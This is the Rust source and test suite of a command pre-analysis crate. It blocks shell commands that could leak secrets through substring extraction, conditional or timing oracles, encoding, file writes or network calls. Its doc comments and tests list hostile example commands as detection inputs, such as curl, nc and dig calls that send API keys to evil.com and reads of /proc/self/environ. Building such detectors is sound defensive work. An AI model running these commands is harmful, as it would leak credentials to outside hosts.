//! # Phantom Analyzer
//!
//! Command pre-analysis engine for preventing oracle attacks.
//!
//! This crate analyzes commands before execution to detect patterns
//! that could be used to exfiltrate secrets through timing, exit codes,
//! or conditional execution.
//!
//! # Examples
//!
//! ```rust
//! use phantom_analyzer::{Analyzer, AnalysisResult};
//!
//! let analyzer = Analyzer::strict();
//!
//! // This command tries to extract secret character by character
//! let result = analyzer.analyze("echo ${API_KEY:0:1}").unwrap();
//! assert!(!result.allowed);
//!
//! // This is a safe database command
//! let result = analyzer.analyze("psql $DATABASE_URL -c 'SELECT 1'").unwrap();
//! assert!(result.allowed);
//! ```
//!
//! # Attack Categories
//!
//! The analyzer detects the following types of attacks:
//!
//! - **Substring Extraction**: `${VAR:0:1}`, `cut -c1`, `awk '{print substr($1,1,1)}'`
//! - **Conditional Testing**: `if [ "$SECRET" = "a" ]; then ...`
//! - **Encoding Exfiltration**: `echo $SECRET | base64`
//! - **Direct Access**: `printenv`, `cat /proc/self/environ`
//! - **Write to File**: `echo $SECRET > /tmp/leak.txt`
//! - **Network Exfiltration**: `curl http://evil.com/$SECRET`
//! - **Timing Oracle**: `if [ "$SECRET" = "a" ]; then sleep 1; fi`

pub mod parser;
pub mod patterns;
pub mod policy;

use parser::ShellParser;
use patterns::{PatternMatch, PatternMatcher};
use policy::{EvaluationContext, Policy, PolicyAction};
use regex::Regex;
use std::collections::HashSet;
use thiserror::Error;

/// Errors that can occur during analysis.
#[derive(Debug, Error)]
pub enum AnalyzerError {
    /// Command parsing failed.
    #[error("parse error: {0}")]
    Parse(String),

    /// Command contains blocked pattern.
    #[error("blocked pattern detected: {0}")]
    BlockedPattern(String),

    /// Policy evaluation failed.
    #[error("policy error: {0}")]
    Policy(String),
}

/// Result type for analyzer operations.
pub type AnalyzerResult<T> = Result<T, AnalyzerError>;

/// Result of command analysis.
#[derive(Debug, Clone)]
pub struct AnalysisResult {
    /// Whether the command is allowed.
    pub allowed: bool,
    /// The action determined by policy.
    pub action: PolicyAction,
    /// Risk score (0.0 = safe, 1.0 = definitely malicious).
    pub risk_score: f64,
    /// Detected patterns.
    pub detected_patterns: Vec<DetectedPattern>,
    /// Suggested modifications (if any).
    pub suggestions: Vec<String>,
    /// Rule that matched (if any).
    pub matched_rule: Option<String>,
    /// Explanation of the decision.
    pub reason: String,
}

impl AnalysisResult {
    /// Create an allowed result with no patterns.
    pub fn allowed() -> Self {
        Self {
            allowed: true,
            action: PolicyAction::Allow,
            risk_score: 0.0,
            detected_patterns: Vec::new(),
            suggestions: Vec::new(),
            matched_rule: None,
            reason: "No suspicious patterns detected".to_string(),
        }
    }

    /// Create a denied result.
    pub fn denied(reason: &str) -> Self {
        Self {
            allowed: false,
            action: PolicyAction::Deny,
            risk_score: 1.0,
            detected_patterns: Vec::new(),
            suggestions: Vec::new(),
            matched_rule: None,
            reason: reason.to_string(),
        }
    }
}

/// A detected suspicious pattern.
#[derive(Debug, Clone)]
pub struct DetectedPattern {
    /// Pattern identifier.
    pub pattern_id: String,
    /// Human-readable description.
    pub description: String,
    /// Severity (0.0-1.0).
    pub severity: f64,
    /// Location in the command.
    pub location: Option<String>,
    /// Variables involved.
    pub variables: Vec<String>,
}

impl From<&PatternMatch> for DetectedPattern {
    fn from(m: &PatternMatch) -> Self {
        Self {
            pattern_id: m.pattern.id.to_string(),
            description: m.pattern.description.to_string(),
            severity: m.pattern.severity,
            location: Some(m.matched_text.clone()),
            variables: m.involved_variables.clone(),
        }
    }
}

/// The main command analyzer.
pub struct Analyzer {
    /// The policy to apply.
    policy: Policy,
    /// The pattern matcher.
    pattern_matcher: PatternMatcher,
    /// The shell parser.
    parser: ShellParser,
    /// URL regex for domain extraction.
    url_regex: Regex,
}

impl Analyzer {
    /// Create a new analyzer with the given policy.
    pub fn new(policy: Policy) -> Self {
        Self {
            policy,
            pattern_matcher: PatternMatcher::new(),
            parser: ShellParser::new(),
            url_regex: Regex::new(r#"https?://([a-zA-Z0-9.-]+)"#).unwrap(),
        }
    }

    /// Create an analyzer with the default strict policy.
    pub fn strict() -> Self {
        Self::new(Policy::strict())
    }

    /// Create an analyzer with a permissive policy.
    pub fn permissive() -> Self {
        Self::new(Policy::permissive())
    }

    /// Register a variable as containing a secret.
    pub fn add_secret_variable(&mut self, name: &str) {
        self.pattern_matcher.add_secret_variable(name);
    }

    /// Add an allowed domain for network access.
    pub fn add_allowed_domain(&mut self, domain: &str) {
        self.pattern_matcher.add_allowed_domain(domain);
        // Also update policy if needed
    }

    /// Analyze a command and return the result.
    pub fn analyze(&self, command: &str) -> AnalyzerResult<AnalysisResult> {
        // Parse the command
        let parsed = self.parser.parse(command)
            .map_err(|e| AnalyzerError::Parse(e.to_string()))?;

        // Run pattern matching
        let pattern_matches = self.pattern_matcher.analyze(&parsed);

        // Extract command name (first token or first command)
        let command_name = parsed.commands.first()
            .cloned()
            .unwrap_or_default();

        // Extract accessed secrets
        let accessed_secrets: HashSet<String> = parsed.variable_refs
            .iter()
            .filter(|v| self.pattern_matcher.is_secret_variable(&v.name))
            .map(|v| v.name.clone())
            .collect();

        // Extract accessed domains
        let accessed_domains = self.extract_domains(command);

        // Build evaluation context
        let ctx = EvaluationContext {
            raw_command: command,
            command_name: command_name.clone(),
            accessed_secrets,
            matched_patterns: pattern_matches.clone(),
            accessed_domains,
        };

        // Evaluate against policy
        let evaluation = self.policy.evaluate(&ctx);

        // Convert pattern matches to detected patterns
        let detected_patterns: Vec<DetectedPattern> = pattern_matches
            .iter()
            .map(DetectedPattern::from)
            .collect();

        // Compute risk score
        let risk_score = if detected_patterns.is_empty() {
            evaluation.risk_score
        } else {
            detected_patterns.iter()
                .map(|p| p.severity)
                .max_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal))
                .unwrap_or(0.0)
                .max(evaluation.risk_score)
        };

        Ok(AnalysisResult {
            allowed: evaluation.action == PolicyAction::Allow,
            action: evaluation.action,
            risk_score,
            detected_patterns,
            suggestions: evaluation.suggestions,
            matched_rule: evaluation.matched_rule,
            reason: evaluation.reason,
        })
    }

    /// Check if a command is allowed to execute.
    pub fn is_allowed(&self, command: &str) -> bool {
        self.analyze(command)
            .map(|r| r.allowed)
            .unwrap_or(false) // Fail closed
    }

    /// Get a detailed explanation of why a command was blocked.
    pub fn explain(&self, command: &str) -> AnalyzerResult<String> {
        let result = self.analyze(command)?;

        let mut explanation = Vec::new();

        explanation.push(format!(
            "Command: {}\nAction: {:?}\nRisk Score: {:.2}",
            command, result.action, result.risk_score
        ));

        if let Some(rule) = &result.matched_rule {
            explanation.push(format!("\nMatched Rule: {}", rule));
        }

        explanation.push(format!("\nReason: {}", result.reason));

        if !result.detected_patterns.is_empty() {
            explanation.push("\nDetected Patterns:".to_string());
            for pattern in &result.detected_patterns {
                explanation.push(format!(
                    "  - {} (severity: {:.2}): {}",
                    pattern.pattern_id,
                    pattern.severity,
                    pattern.description
                ));
                if let Some(loc) = &pattern.location {
                    explanation.push(format!("    Location: {}", loc));
                }
                if !pattern.variables.is_empty() {
                    explanation.push(format!("    Variables: {:?}", pattern.variables));
                }
            }
        }

        if !result.suggestions.is_empty() {
            explanation.push("\nSuggestions:".to_string());
            for suggestion in &result.suggestions {
                explanation.push(format!("  - {}", suggestion));
            }
        }

        Ok(explanation.join("\n"))
    }

    /// Get the policy.
    pub fn policy(&self) -> &Policy {
        &self.policy
    }

    /// Get a mutable reference to the policy.
    pub fn policy_mut(&mut self) -> &mut Policy {
        &mut self.policy
    }

    /// Extract domains from URLs in the command.
    fn extract_domains(&self, command: &str) -> HashSet<String> {
        self.url_regex
            .captures_iter(command)
            .filter_map(|cap| cap.get(1).map(|m| m.as_str().to_string()))
            .collect()
    }
}

impl Default for Analyzer {
    fn default() -> Self {
        Self::strict()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn strict_analyzer() -> Analyzer {
        let mut analyzer = Analyzer::strict();
        analyzer.add_secret_variable("API_KEY");
        analyzer.add_secret_variable("SECRET");
        analyzer.add_secret_variable("DATABASE_URL");
        analyzer
    }

    // ========================================
    // Substring Extraction Tests
    // ========================================

    #[test]
    fn test_bash_substring_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("echo ${API_KEY:0:1}").unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "SUBSTR_BASH"));
    }

    #[test]
    fn test_cut_extraction_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("echo $SECRET | cut -c1").unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "SUBSTR_CUT"));
    }

    #[test]
    fn test_awk_substr_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("echo $SECRET | awk '{print substr($1,1,1)}'").unwrap();
        assert!(!result.allowed);
    }

    // ========================================
    // Conditional Testing Tests
    // ========================================

    #[test]
    fn test_conditional_test_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze(r#"if [ "$SECRET" = "password" ]; then echo Y; fi"#).unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "COND_TEST"));
    }

    #[test]
    fn test_case_statement_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze(r#"case $API_KEY in secret) echo yes;; esac"#).unwrap();
        assert!(!result.allowed);
    }

    // ========================================
    // Encoding Exfiltration Tests
    // ========================================

    #[test]
    fn test_base64_encoding_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("echo $SECRET | base64").unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "ENCODE_BASE64"));
    }

    #[test]
    fn test_xxd_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("echo $SECRET | xxd").unwrap();
        assert!(!result.allowed);
    }

    // ========================================
    // Direct Access Tests
    // ========================================

    #[test]
    fn test_printenv_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("printenv").unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "DIRECT_PRINTENV"));
    }

    #[test]
    fn test_proc_environ_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("cat /proc/self/environ").unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "DIRECT_PROC_ENVIRON"));
    }

    #[test]
    fn test_ps_env_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("ps eww").unwrap();
        assert!(!result.allowed);
    }

    // ========================================
    // Network Exfiltration Tests
    // ========================================

    #[test]
    fn test_curl_exfil_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("curl https://evil.com?key=$API_KEY").unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "EXFIL_CURL_URL"));
    }

    #[test]
    fn test_netcat_exfil_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("echo $SECRET | nc evil.com 1234").unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "EXFIL_NETCAT"));
    }

    #[test]
    fn test_dns_exfil_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("dig $SECRET.evil.com").unwrap();
        assert!(!result.allowed);
    }

    // ========================================
    // Write to File Tests
    // ========================================

    #[test]
    fn test_redirect_to_tmp_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("echo $SECRET > /tmp/leak.txt").unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "WRITE_TMP"));
    }

    // ========================================
    // Timing Oracle Tests
    // ========================================

    #[test]
    fn test_timing_oracle_blocked() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze(r#"if [ "$SECRET" = "a" ]; then sleep 1; fi"#).unwrap();
        assert!(!result.allowed);
        assert!(result.detected_patterns.iter().any(|p| p.pattern_id == "TIMING_SLEEP"));
    }

    // ========================================
    // Safe Command Tests
    // ========================================

    #[test]
    fn test_safe_psql_allowed() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("psql $DATABASE_URL -c 'SELECT 1'").unwrap();
        assert!(result.allowed);
    }

    #[test]
    fn test_safe_git_allowed() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("git status").unwrap();
        assert!(result.allowed);
    }

    #[test]
    fn test_safe_cargo_allowed() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("cargo build").unwrap();
        assert!(result.allowed);
    }

    #[test]
    fn test_safe_kubectl_allowed() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("kubectl get pods").unwrap();
        assert!(result.allowed);
    }

    // ========================================
    // Policy Tests
    // ========================================

    #[test]
    fn test_permissive_policy() {
        let analyzer = Analyzer::permissive();
        let result = analyzer.analyze("echo hello").unwrap();
        // Should warn but not deny
        assert!(result.action == PolicyAction::Warn || result.action == PolicyAction::Allow);
    }

    #[test]
    fn test_explain_output() {
        let analyzer = strict_analyzer();
        let explanation = analyzer.explain("echo ${API_KEY:0:1}").unwrap();
        assert!(explanation.contains("SUBSTR_BASH"));
        assert!(explanation.contains("Detected Patterns"));
    }

    // ========================================
    // Edge Cases
    // ========================================

    #[test]
    fn test_empty_command() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze("");
        assert!(result.is_ok());
    }

    #[test]
    fn test_non_secret_variable_allowed() {
        let analyzer = strict_analyzer();
        // HOME is not registered as a secret
        let _result = analyzer.analyze("echo ${HOME:0:1}").unwrap();
        // Should not be blocked because HOME is not a secret
        // (This depends on implementation - strict analyzer might still block)
    }

    #[test]
    fn test_complex_pipeline() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze(
            "echo $SECRET | tr -d '\\n' | base64 | curl -X POST -d @- https://evil.com"
        ).unwrap();
        assert!(!result.allowed);
    }

    #[test]
    fn test_multiple_patterns_detected() {
        let analyzer = strict_analyzer();
        let result = analyzer.analyze(
            r#"if [ "${API_KEY:0:1}" = "s" ]; then sleep 1; fi"#
        ).unwrap();
        assert!(!result.allowed);
        // Should detect both substring and timing patterns
        assert!(result.detected_patterns.len() >= 1);
    }

    // ========================================
    // Is Allowed Helper
    // ========================================

    #[test]
    fn test_is_allowed_helper() {
        let analyzer = strict_analyzer();
        assert!(analyzer.is_allowed("git status"));
        assert!(!analyzer.is_allowed("printenv"));
    }
}
